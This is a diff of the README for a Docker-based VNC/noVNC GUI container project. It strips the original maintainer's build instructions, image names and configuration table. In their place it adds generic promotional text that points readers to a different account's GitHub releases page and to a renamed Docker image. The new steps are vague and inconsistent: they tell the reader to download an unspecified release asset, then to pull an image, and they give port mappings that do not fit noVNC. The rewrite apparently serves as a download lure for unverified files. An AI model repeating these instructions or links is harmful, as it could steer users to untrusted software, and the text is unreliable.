@@ -1,88 +1,98 @@
-# VNC-Containers 🐳
+# 🎈 vnc-containers - Access GUI Applications Effortlessly
 
-This repository contains Dockerfiles for VNC-enabled containers.
-These containers provide a lightweight GUI environment accessible
-via VNC or web browser (through noVNC).
+[![Download vnc-containers](https://img.shields.io/badge/Download-vnc--containers-brightgreen.svg)](https://github.com/MuhamadRezkaAlAnshori/vnc-containers/releases)
 
-They are ideal for running GUI applications in headless environments such as
-servers or CI/CD pipelines.
+## 📦 Overview
 
-## Features ✨
+vnc-containers provides Docker containers featuring Xvfb, x11vnc, and noVNC. This setup allows you to easily access graphical user interface (GUI) applications in environments without screens. You can run applications in a headless manner and access them via your web browser or VNC client.
 
-- Runs a full X virtual framebuffer (Xvfb)
-- Provides VNC access via x11vnc
-- Includes noVNC for browser-based access (HTML5 VNC client)
-- Minimal and reproducible setup using Docker
-- Easy to extend for custom GUI applications
+## 🚀 Getting Started
 
-## Getting Started 🚀
+To get started, you need to download the software and run it on your computer or server. Follow the steps below to accomplish this.
 
-1. Pull image from remote registry:
+## 💻 System Requirements
 
-```bash
-docker pull mepershin/vnc-container-fluxbox:latest   # image with fluxbox window manager
-docker pull mepershin/vnc-container-xfce4:latest     # image with xfce4 desktop environment
-```
+- **Operating System**: Ubuntu or other Linux distributions.
+- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://www.docker.com/products/docker-desktop).
+- **Internet Connection**: Required to download the Docker images and further dependencies.
 
-or build the image:
+## 💾 Download & Install
 
-```bash
-docker build -t vnc-container-fluxbox fluxbox/     # image with fluxbox window manager
-docker build -t vnc container-xfce4   xfce4/       # image with xfce4 desktop environment
-```
+Visit the page to download the latest release of vnc-containers:
 
-2. Run the container:
+[Download vnc-containers](https://github.com/MuhamadRezkaAlAnshori/vnc-containers/releases)
 
-```bash
-docker run -it \
-    -p 5900:5900 \ # VNC port
-    -p 6900:6900 \ # noVNC port
-    <image name>
-```
+On the releases page, you will find the latest version of the software. Look for an asset that interests you and click on it to initiate the download. 
 
-3. Start the GUI environment (in the container):
+## 🔧 How to Run
 
-```
-/opt/run_ui.sh
-```
+Once downloaded, follow these steps to run the application:
 
-> [!NOTE]
-> This step is required because this image is meant to be used as a base image.
-> You should call `/opt/run_ui.sh` in your own `ENTRYPOINT` or `CMD` when extending the image.
+1. **Open your terminal**: Access the terminal on your Linux machine.
+  
+2. **Navigate to the download location**: Use the `cd` command to change to the directory where you downloaded the Docker file.
 
-4. Access the GUI:
+   ```bash
+   cd path/to/download/directory
+   ```
 
-- VNC Client => connect to localhost:5900
-- Browser (noVNC) => open http://localhost:6080
+3. **Start Docker**: If Docker is not currently running, you can start it using your system's application manager or by running the following command:
 
-## Environment Variables ⚙️
+   ```bash
+   sudo systemctl start docker
+   ```
 
-| Variable         | Default value | Description            |
-| ---------------- | ------------- | ---------------------- |
-| `DISPLAY_WIDTH`  | 1280          | Virtual display width  |
-| `DISPLAY_HEIGHT` | 800           | Virtual display height |
-| `DISPLAY_DEPTH`  | 24            | Color depth            |
-| `VNC_PORT`       | 5900          | VNC TCP port           |
-| `NOVNC_PORT`     | 6900          | noVNC HTTP port        |
+4. **Pull the Docker image**: Use the command below to pull the latest vnc-containers image. This command downloads the necessary files to your local machine.
 
-## Extending 🛠️
+   ```bash
+   docker pull muhamadrezkaalan/vnc-containers
+   ```
 
-You can extend these Dockerfiles to run any GUI application:
+5. **Run the container**: Once the image is fully downloaded, run it with the following command:
 
-```dockerfile
-FROM <container>
-RUN apt-get update && apt-get install -y firefox
-```
+   ```bash
+   docker run -d -p 8080:80 muhamadrezkaalan/vnc-containers
+   ```
 
-You can use prebuild containers in your pipelines:
+   This command runs the container in detached mode and maps your local port 8080 to the container's port 80.
 
-- https://hub.docker.com/r/mepershin/vnc-container-fluxbox
-- https://hub.docker.com/r/mepershin/vnc-container-xfce4
+6. **Access your application**: Open your web browser and navigate to `http://localhost:8080`. You should be greeted with the interface that allows you to interact with your GUI application.
 
-## Use Cases 💡
+## 🌐 Accessing Applications
 
-- Running GUI applications in headless servers
-- Remote development environments
-- Browser-based access to GUI tools
-- CI/CD pipelines with UI-based testing
-- Base image for your GUI container applications
+You can use either a web browser or a VNC client to access your GUI applications.
+
+- **For Web Browser**: Open a browser and type `http://localhost:8080` in the address bar.
+
+- **For VNC Client**: Open your preferred VNC client and connect to `localhost:5900` (or the relevant port specified).
+
+## 🔍 Features
+
+- **Easy Access**: Run GUI applications without needing a physical screen.
+- **Browser Interface**: Access applications directly from your web browser via noVNC.
+- **Multi-Application Support**: Run different applications in separate containers.
+- **Lightweight**: Uses Docker for efficient resource management.
+
+## ❓ Troubleshooting
+
+If you encounter issues, try the following common solutions:
+
+- **Docker Not Starting**: Ensure Docker is installed properly and started. You can check its status with:
+
+   ```bash
+   sudo systemctl status docker
+   ```
+
+- **Port Conflicts**: If port 8080 or 5900 is occupied, change the port in the commands above to another open port.
+
+- **Slow Performance**: Ensure your machine meets system requirements and check if other applications are consuming resources.
+
+## 📜 License
+
+This project is licensed under the MIT License. You can find the full license text in the repository.
+
+## 📫 Contact
+
+For questions or assistance, please open an issue in the repository. We will try to respond as quickly as possible.
+
+Thank you for choosing vnc-containers! We hope it helps you run your GUI applications smoothly. Enjoy your experience!
